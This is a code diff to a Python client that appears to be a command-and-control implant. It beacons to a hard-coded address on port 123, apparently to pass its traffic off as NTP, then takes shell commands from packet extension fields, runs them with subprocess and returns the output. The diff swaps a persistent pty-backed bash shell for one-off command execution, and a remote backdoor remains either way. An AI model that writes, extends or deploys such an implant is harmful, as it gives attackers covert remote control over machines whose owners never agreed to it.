@@ -10,21 +10,10 @@ import struct
 import subprocess
 import time
 import random
-import pty
-import os
 
 server_address = "192.168.1.159"
 server_port = 123
 client = None
-
-master, slave = pty.openpty()
-shell = subprocess.Popen(
-    ["/bin/bash"],
-    stdin=slave,
-    stdout=slave,
-    stderr=slave,
-    text=True
-)
 
 """
 This function attempts to connect to the server. 
@@ -98,21 +87,9 @@ def handle_data(data):
         if exts:
                 command = exts[0][1].decode().replace("\x00", "")
                 print(f"Executing command {command}...")
-                # output = subprocess.run(command, capture_output=True, shell=True)
-                # print(f"Command executed with return code {output.returncode}")
-                
-                shell.stdin.write(command + "\n")
-                shell.stdin.flush()
-                time.sleep(0.5)
-                response = ""
-                while True: 
-                    line = shell.stdout.readline()
-                    if not line: 
-                        break
-                    output += line
-                    if line.strip == "cf-c2":
-                        break
-                # response = output.stdout.decode() if output.stdout else ""
+                output = subprocess.run(command, capture_output=True, shell=True)
+                print(f"Command executed with return code {output.returncode}")
+                response = output.stdout.decode() if output.stdout else ""
                 print(f"Command output:\n{response}")
                 send_response(response)
     except Exception as e:
